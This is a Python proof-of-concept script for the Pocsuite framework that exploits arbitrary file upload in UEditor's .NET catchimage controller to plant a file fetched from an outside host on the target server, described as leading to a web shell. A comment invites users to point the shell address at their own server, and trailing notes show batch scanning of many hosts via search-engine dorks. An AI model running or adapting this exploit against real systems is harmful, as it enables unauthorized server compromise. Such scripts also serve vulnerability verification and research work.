#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class ueditorPOC(POCBase):
    vulID = '51'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-08-23' #漏洞公开的时间,不知道就写今天

    author = 'colorway' #  PoC作者的大名
    createDate = '2018-08-23'# 编写 PoC 的日期
    updateDate = '2018-08-23'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'Ueditor .net upload'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'Ueditor'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'File Upload'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Ueditor .net任意文件上传导致getshell
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 1-redis.py -u 10.1.5.26 --verify

    ##########################################
    #                                        #
    #     更改shell_addr为自己的服务器资源      #
    #                                        #
    ##########################################

    def _verify(self):
        from urlparse import urlparse
        import json
        #定义返回结果
        result = {}
        #获取漏洞url
        url = '%s' % self.url
        proxies = {
            # 'http':'http://127.0.0.1:8080',
            # 'https':'http://127.0.0.1:8080',
        }

        #如果设置端口则取端口,没有设置则为默认端口
        try:
            # http://file.0535code.com/ue_poc.jpg
            shell_ip = 'file.0535code.com'
            shell_file = 'ue_poc.jpg'
            shell_addr = urlparse(url).scheme + '://' + shell_ip + '/' + shell_file + '?.txt'
            print shell_addr
            vul_ip = urlparse(url).netloc
            print vul_ip
            vul_url = urlparse(url).scheme + '://' + vul_ip + '/ueditor/net/controller.ashx?action=catchimage'
            print vul_url 
            test_url = urlparse(url).scheme + '://' + vul_ip + '/ueditor'
            print test_url
            res = req.get(test_url, timeout=5, verify=False,)
            if res.status_code == 200:
            # http://120.79.20.253/
            # http://120.79.20.253/ueditor/
                params = {"source[]": (None, shell_addr),}
                res = req.post(vul_url, files=params, timeout=5, verify=False, proxies=proxies,)
                if res.text:
                    print res.text
                    res_data = json.loads(res.text)
                    print res_data
                    if res_data['state'] == 'SUCCESS':
                        upload_addr = res_data['list'][0]['url']
                        print upload_addr
                        upload_url = urlparse(url).scheme + '://' + vul_ip + '/ueditor/net/' + upload_addr
                        print upload_url
                        res = req.get(upload_url, timeout=5, verify=False, proxies=proxies,)
                        if res.status_code == 200 and 'vulnerable' in res.text:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = upload_url
                            result['VerifyInfo']['Payload'] = vul_url

        except Exception as e:
            # return host
            print e
       
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ueditorPOC)











"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md


钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html


pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html

"""
